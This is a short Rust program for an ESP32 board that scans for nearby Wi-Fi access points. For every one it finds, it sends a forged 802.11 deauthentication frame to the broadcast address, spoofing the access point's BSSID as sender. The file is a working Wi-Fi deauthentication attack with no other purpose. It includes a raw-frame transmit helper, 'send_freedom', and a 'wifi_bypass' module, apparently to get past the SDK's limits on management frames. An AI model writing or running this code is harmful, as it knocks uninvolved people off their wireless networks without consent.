use esp_idf_sys as _; // If using the `binstart` feature of `esp-idf-sys`, always keep this module imported
use log::*;
use esp_idf_hal::peripherals::Peripherals;
use esp_idf_svc::{
    wifi::{EspWifi, WifiDeviceId},
    nvs::EspDefaultNvsPartition,
    eventloop::EspSystemEventLoop,
};
use esp_idf_sys::{EspError, esp_wifi_80211_tx};

mod wifi_bypass;

fn main() {
    // It is necessary to call this function once. Otherwise some patches to the runtime
    // implemented by esp-idf-sys might not link properly. See https://github.com/esp-rs/esp-idf-template/issues/71
    esp_idf_sys::link_patches();
    // Bind the log crate to the ESP Logging facilities
    esp_idf_svc::log::EspLogger::initialize_default();

    info!("Starting...");

    let peripherals = Peripherals::take().unwrap();
    let sys_loop = EspSystemEventLoop::take().unwrap();
    let nvs = EspDefaultNvsPartition::take().unwrap();
    
    let mut wifi_driver = EspWifi::new(
        peripherals.modem,
        sys_loop,
        Some(nvs)
    ).unwrap();

    let scan_results = wifi_driver.scan().unwrap();
    for ap in scan_results{
        wifi_driver.driver_mut().send(WifiDeviceId::Ap, &frame_builder(ap.bssid)).unwrap();   
    }
}

fn frame_builder(bssid: [u8; 6]) -> [u8; 26] {
    let mut frame: [u8; 26] = [
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    ];

    for n in 0..2 {
        let offset = 10+(6*n);
        for i in 0..6{
            frame[offset+i] = bssid[i];
        }
    }

    // return the frame:
    frame
}

/// As per [`esp_idf_sys::esp_wifi_internal_tx`](esp_idf_sys::esp_wifi_internal_tx)
pub fn send_freedom(device_id: WifiDeviceId, frame: &[u8]) -> Result<(), EspError> {
    use esp_idf_sys::esp;

    esp!(unsafe {
        esp_wifi_80211_tx(device_id.into(), frame.as_ptr() as *mut _, frame.len() as _, false)
    })
}